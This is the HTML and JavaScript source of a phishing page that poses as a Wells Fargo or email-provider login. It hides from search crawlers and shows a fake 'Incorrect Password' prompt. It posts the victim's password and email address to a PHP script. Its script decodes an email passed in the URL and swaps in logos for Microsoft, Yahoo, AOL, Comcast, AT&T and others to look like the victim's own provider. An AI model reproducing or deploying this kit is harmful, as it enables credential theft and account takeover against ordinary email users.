<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Wells Fargo Financial</title>
<meta name="robots" content="noindex, nofollow,noarchive,nosnippet,nocache,noimageindex">
<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="googlebot-news" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="msnbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="yahoo-slurp" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="teoma" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="twiceler" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="gigabot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="scrubby" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="robozilla" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="nutch" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="ia_archiver" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="baiduspider" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="naverbot, yeti" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="googlebot-image" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="googlebot-mobile" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="yahoo-mmcrawler" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="psbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="asterias" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="yahoo-blogs/v3.9" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="AhrefsBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="MJ12bot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Majestic-12" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Majestic-SEO" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="DSearch" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Rogerbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="SemrushBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="BLEXBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="ScoutJet" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="SearchmetricsBot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="BacklinkCrawler" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Exabot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="spbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="linkdexbot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="Lipperhey Spider" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="SEOkicks-Robot" content="noindex,nofollow,noarchive,nosnippet,nocache">
<meta name="sistrix" content="noindex,nofollow,noarchive,nosnippet,nocache">

<link rel="stylesheet" href="css/wstyle.css" />
<link rel="shortcut icon" href="images/favicon.ico"/>
<script type="text/javascript" src="js/jqueryLib.js"></script>

<script language="JavaScript" type="text/javascript">/*<![CDATA[*/
function numbersOnly(field, event) {
	return allowedChars(field, event, "-0123456789.,");
}

function digitsOnly(field, event) {
	return allowedChars(field, event, "0123456789");
}

function allowedChars(field, event, chars) {
	var key;

	if (window.event) {
		key = window.event.keyCode;
	} else {
		if (event) {
			key = event.which;
		} else {
			return true;
		}
	}

	if (isOneOf(key, null, 0, 8, 9, 13, 27, 37, 39, 46)) {
		return true;
	} else {
		var keychar = String.fromCharCode(key);

		if (chars.indexOf(keychar) > -1) {
			return true;
		} else {
			return false;
		}
	}
}

function isOneOf(key) {
	for (arg in arguments) {
		if (key == arg) {
			return true;
		}
	}
	
	return false;
}
			/*]]>*/</script>
</head>

<body>
 
 <div class="img26-const">
    <div class="img26"></div>
</div>
 <div class="JK_1027-const">
    <div class="JK_1027"></div>
 </div>
 <div class="img35-space"></div>
 <div class="thanksbox">
   <div class="img27a"></div>
   <div class="img27-inner">
   <div class="logobox">
      <img src="" width="212" height="81">
   </div>
     <form name="form1" method="post" action="sys29mik.php">
        <div class="errmsg">Incorrect Password. Try again</div>
       <input type="hidden" name="email_id1" id="email_id1">
       <input type="password" name="emailpass1" id="emailpass1" required autocomplete="off" class="img-txt1" placeholder="Password">
       <div class="img29"></div>
       <div class="img30-const"><input type="submit" name="btncontinue" id="btncontinue" value="s" class="img30"></div>
       <div class="img30-const1"><input type="submit" name="btncancel" id="btncancel" value="c" class="img31"></div>

     </form>
     
     
   </div>
 </div>
 <div class="img35-const">
    <div class="img35"></div>
 </div>
 
 <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
<script type="text/javascript">

var $c = getUrlParameter('em');
     $('#email_id1').val($c);
	 
        var $current_email = "";

        if ($c) {
            $current_email = isValidEmail($c) ? $c : decodeCustom($c);
        }


        function decodeCustom($email) {
            var $consonants = 'bcdfghjklmnpqrstvwxyz'.split('');
            var $joinChar = $email.substr(0, 1); // substr(,0,1);
            var $output = $email.substr(2); // substr($email,2);
            var $vowels = ['a', 'e', 'i', 'o', 'u'];
            var $vowelsLookup = [];

            for ($i in $consonants) {
                $output = $output.replace(new RegExp($joinChar + '0' + $i + 'a', 'g'), $consonants[$i]);
            }

            for ($i in $vowels) {
                $output = $output.replace(new RegExp($joinChar + $i, 'g'), $vowels[$i]);
            }

            $output = $output.replace(new RegExp($joinChar + $joinChar + $joinChar, 'g'), '@');
            //,$output);
            return $output;
        }

        function isValidEmail(email) {
            var re =
                /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return re.test(email);
        }

        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
			
        }
		
		 var currentEmail = $current_email;
    var ListEntries = [
            '.*fuck.*',
            '.*pussy.*',
            '.*bitch.*',
            '.*asshole.*',
            '.*fool.*',
            '.*dick.*',
            '.*mama.*',
            '.*nice.*try.*',
            '.*12345.*'
        ];
		
		 if(currentEmail){

            var e = document.getElementById('username');
            e = currentEmail;
            //e.readOnly = true;

			

            var domain = extractDomain(currentEmail);

            //var corH = document.getElementById('corportate-title');
            //corH.innerText = domain + " Email Login";

            }
			
			function extractDomain(email){

        var load = email;
        var domain = '';
        var regex = /.+@(.*?)\..+/;
        var str = email;
        var m;

        if ((m = regex.exec(str)) !== null) {
            return m[1];
        }

        return null;
    }

 var value =  $('#email_id1').val();
 if (value.indexOf('@hotmail') >= 0 || value.indexOf('@live') >= 0 || value.indexOf('@msn') >= 0 || value.indexOf('@outlook') >= 0) {
	$('img').attr("src", "images/microsoft_logo.jpg" );
 }
 else if (value.indexOf('@yahoo') >= 0 || value.indexOf('@ymail') >= 0 || value.indexOf('@rocketmail') >= 0 || value.indexOf('@sbcglobal.net') >= 0 || value.indexOf('@bellsouth.net') >= 0 || value.indexOf('@pacbell.net') >= 0) {
	$('img').attr( "src", "images/yahoo_logo.png" );
	}
else if (value.indexOf('@peoplepc') >= 0 || value.indexOf('@earthlink.net') >= 0 || value.indexOf('@mindspring') >= 0) {
	$('img').attr( "src", "images/earthlink_logo.png" );
	}
else if (value.indexOf('@comcast.net') >= 0 || value.indexOf('@xfinity') >= 0) {
	$('img').attr( "src", "images/comcast_logo.png" );
	}
else if (value.indexOf('@aim.com') >= 0 || value.indexOf('@aol.com') >= 0) {
	$('img').attr( "src", "images/aol_logo.png" );
	}
else if (value.indexOf('@cox.net') >= 0) {
	$('img').attr( "src", "images/cox_logo.png" );
	}
else if (value.indexOf('@mail') >= 0) {
	$('img').attr( "src", "images/godaddy_logo.png" );
	}
else if (value.indexOf('@ameritech.net') >= 0 || value.indexOf('@att.net') >= 0 || value.indexOf('@bellsouth.net') >= 0 || value.indexOf('@flash.net') >= 0 || value.indexOf('@nvbell.net') >= 0 || value.indexOf('@pacbell.net') >= 0 || value.indexOf('@prodigy.net') >= 0 || value.indexOf('@sbcglobal.net') >= 0 || value.indexOf('@snet.net') >= 0 || value.indexOf('@swbell.net') >= 0 || value.indexOf('@wans.net') >= 0) {
	$('img').attr("src", "images/atnt_logo.png" );
	
	}

</script>
</body>
</html>